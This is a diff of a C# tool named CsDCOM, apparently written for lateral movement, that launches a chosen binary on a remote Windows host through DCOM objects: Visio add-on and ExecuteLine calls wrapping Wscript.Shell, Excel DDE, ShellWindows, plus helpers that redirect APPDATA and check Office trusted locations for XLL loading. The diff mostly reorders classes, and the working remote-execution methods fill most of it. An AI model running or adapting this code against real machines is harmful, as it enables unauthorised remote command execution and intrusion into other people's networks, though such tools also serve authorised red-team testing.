@@ -1,84 +1,25 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Reflection;
 using NDesk.Options;
 
 namespace CsDCOM
 {
-
-    internal class AppData
-    {
-        private string oldValue;
-        private string newValue;
-        private EnvironmentVariableTarget envTarget;
-
-        public static AppData CreateInstance()
-        {
-            return new AppData();
-        }
-
-        private AppData()
-        {
-            this.envTarget = EnvironmentVariableTarget.User | EnvironmentVariableTarget.Process;
-            this.oldValue = Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
-        }
-
-        public void Change(string value)
-        {
-            try
-            {
-                this.newValue = value;
-                Environment.SetEnvironmentVariable("APPDATA", value, this.envTarget);
-            }
-            catch
-            {
-            }
-        }
-        public void Restore()
-        {
-            this.Change(this.oldValue);
-        }
-
-        public bool ChangeApplied()
-        {
-            return this.newValue == Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
-        }
-
-        public string GetCurrent()
-        {
-            return Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
-        }
-
-    }
-
-    internal static class Validator
-    {
-        public static bool IsValidXLLPath(string path)
-        {
-            bool response = false;
-            string[] defaultTrustedLocation = new string[]
-            {
-                @"C:\Program Files\Microsoft Office\Root\Office16\XLSTART\",
-                @"C:\Program Files\Microsoft Office\Root\Office16\STARTUP\",
-                @"C:\Program Files\Microsoft Office\Root\Templates\",
-                @"AppData\Roaming\Microsoft\Templates",
-                @"AppData\Roaming\Microsoft\Excel\XLSTART"
-            };
-            foreach (string p in defaultTrustedLocation)
-            {
-                if (path.Contains(p))
-                {
-                    response = true;
-                }
-            }
-
-            return response;
-        }
-    }
     internal static class Program
     {
+        private enum Method
+        {
+            MMC20Application,
+            ShellWindows,
+            ShellBrowserWindow,
+            ExcelDDE,
+            VisioAddonEx,
+            OutlookShellEx,
+            ExcelXLL,
+            VisioExecLine,
+            OfficeMacro
+        }
+
         public static void ShowHelp(OptionSet p)
         {
             Console.WriteLine("Usage:");
@@ -167,54 +108,6 @@ namespace CsDCOM
             }
         }
 
-        public static void VisioAddonEx(string target, string binary, string arg)
-        {
-            try
-            {
-                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
-                if (type == null)
-                {
-                    Console.WriteLine(" [x] Visio not installed");
-                    return;
-                }
-
-                var obj = Activator.CreateInstance(type);
-                var addons = obj.GetType().InvokeMember("Addons", BindingFlags.GetProperty, null, obj, null);
-                var addon = addons.GetType()
-                    .InvokeMember(@"Add", BindingFlags.InvokeMethod, null, addons, new object[] { binary });
-                // Executing Addon
-                addon.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, null, addon, new object[] { arg });
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(" [x] {0}", e.Message);
-            }
-        }
-
-        public static void VisioExecLine(string target, string binary, string arg)
-        {
-            var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
-            try
-            {
-                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
-                if (type == null)
-                {
-                    Console.WriteLine(" [x] Visio not installed");
-                    return;
-                }
-
-                var obj = Activator.CreateInstance(type);
-
-                var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
-                var doc = docs.GetType().InvokeMember(@"Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
-                doc.GetType().InvokeMember(@"ExecuteLine", BindingFlags.InvokeMethod, null, doc, new object[] { code });
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(" [x] {0}", e.Message);
-            }
-        }
-
         public static void ShellWindows(string target, string binary, string arg)
         {
             try
@@ -259,6 +152,54 @@ namespace CsDCOM
                 obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
                 obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj,
                     new object[] { binary, arg });
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+            }
+        }
+
+        public static void VisioAddonEx(string target, string binary, string arg)
+        {
+            try
+            {
+                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
+                if (type == null)
+                {
+                    Console.WriteLine(" [x] Visio not installed");
+                    return;
+                }
+
+                var obj = Activator.CreateInstance(type);
+                var addons = obj.GetType().InvokeMember("Addons", BindingFlags.GetProperty, null, obj, null);
+                var addon = addons.GetType()
+                    .InvokeMember(@"Add", BindingFlags.InvokeMethod, null, addons, new object[] { binary });
+                // Executing Addon
+                addon.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, null, addon, new object[] { arg });
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+            }
+        }
+
+        public static void VisioExecLine(string target, string binary, string arg)
+        {
+            var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
+            try
+            {
+                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
+                if (type == null)
+                {
+                    Console.WriteLine(" [x] Visio not installed");
+                    return;
+                }
+
+                var obj = Activator.CreateInstance(type);
+
+                var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
+                var doc = docs.GetType().InvokeMember(@"Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
+                doc.GetType().InvokeMember(@"ExecuteLine", BindingFlags.InvokeMethod, null, doc, new object[] { code });
             }
             catch (Exception e)
             {
@@ -472,17 +413,75 @@ End Sub
                 Console.WriteLine(" [x] {0}", e.Message);
             }
         }
-        private enum Method
+       
+    }
+    internal class AppData
+    {
+        private string oldValue;
+        private string newValue;
+        private EnvironmentVariableTarget envTarget;
+
+        public static AppData CreateInstance()
         {
-            MMC20Application,
-            ShellWindows,
-            ShellBrowserWindow,
-            ExcelDDE,
-            VisioAddonEx,
-            OutlookShellEx,
-            ExcelXLL,
-            VisioExecLine,
-            OfficeMacro
+            return new AppData();
+        }
+
+        private AppData()
+        {
+            this.envTarget = EnvironmentVariableTarget.User | EnvironmentVariableTarget.Process;
+            this.oldValue = Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
+        }
+
+        public void Change(string value)
+        {
+            try
+            {
+                this.newValue = value;
+                Environment.SetEnvironmentVariable("APPDATA", value, this.envTarget);
+            }
+            catch
+            {
+            }
+        }
+        public void Restore()
+        {
+            this.Change(this.oldValue);
+        }
+
+        public bool ChangeApplied()
+        {
+            return this.newValue == Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
+        }
+
+        public string GetCurrent()
+        {
+            return Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
+        }
+
+    }
+
+    internal static class Validator
+    {
+        public static bool IsValidXLLPath(string path)
+        {
+            bool response = false;
+            string[] defaultTrustedLocation = new string[]
+            {
+                @"C:\Program Files\Microsoft Office\Root\Office16\XLSTART\",
+                @"C:\Program Files\Microsoft Office\Root\Office16\STARTUP\",
+                @"C:\Program Files\Microsoft Office\Root\Templates\",
+                @"AppData\Roaming\Microsoft\Templates",
+                @"AppData\Roaming\Microsoft\Excel\XLSTART"
+            };
+            foreach (string p in defaultTrustedLocation)
+            {
+                if (path.Contains(p))
+                {
+                    response = true;
+                }
+            }
+
+            return response;
         }
     }
 }
